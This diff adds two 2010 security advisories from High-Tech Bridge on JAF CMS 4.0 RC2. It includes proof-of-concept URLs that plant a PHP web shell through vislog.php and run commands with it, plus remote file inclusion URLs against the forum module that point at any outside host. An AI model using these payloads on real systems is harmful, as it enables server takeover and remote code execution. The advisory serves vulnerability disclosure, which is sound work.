@@ -1,0 +1,45 @@
+Vulnerability ID: HTB22665
+Reference: http://www.htbridge.ch/advisory/shell_create__command_execution_in_jaf_cms.html
+Product: JAF CMS
+Vendor: JAF CMS ( http://jaf-cms.sourceforge.net/ ) 
+Vulnerable Version: 4.0 RC2
+Vendor Notification: 21 October 2010 
+Vulnerability Type: Shell create & command execution
+Status: Not Fixed, Vendor Alerted, Awaiting Vendor Response
+Risk level: High 
+Credit: High-Tech Bridge SA - Ethical Hacking & Penetration Testing (http://www.htbridge.ch/) 
+
+Vulnerability Details:
+The vulnerability exists due to failure in the "/module/log/vislog.php" script to properly sanitize user-supplied input, it's possible to create/read any file.
+
+The following PoC is available:
+
+creating shell:
+
+http://[host]/module/log/vislog.php?_SERVER[%27PHP_SELF%27]=1&from=%3c%3f+system(%24_GET%5b%27cmd%27%5d)%3b+%3f%3e&root=../../123.php%00
+
+
+command execute:
+
+http://[host]/123.php?cmd=ls 
+
+
+Vulnerability ID: HTB22666
+Reference: http://www.htbridge.ch/advisory/rfi_in_jaf_cms.html
+Product: JAF CMS
+Vendor: JAF CMS ( http://jaf-cms.sourceforge.net/ )
+Vulnerable Version: 4.0 RC2
+Vendor Notification: 21 October 2010
+Vulnerability Type: Remote File Inclusion
+Status: Not Fixed, Vendor Alerted, Awaiting Vendor Response
+Risk level: High
+Credit: High-Tech Bridge SA - Ethical Hacking & Penetration Testing (http://www.htbridge.ch/)
+
+Vulnerability Details:
+The vulnerability exists due to failure in the "/module/forum/main.php" & "/module/forum/forum.php" scripts to properly sanitize user-supplied input, it's possible to include any remote file if register_globals = On.
+
+The following PoC is available:
+
+
+http://[host]/module/forum/main.php?website=http://any_host/any_file%00
+http://[host]/module/forum/forum.php?website=http://any_host/any_file%00
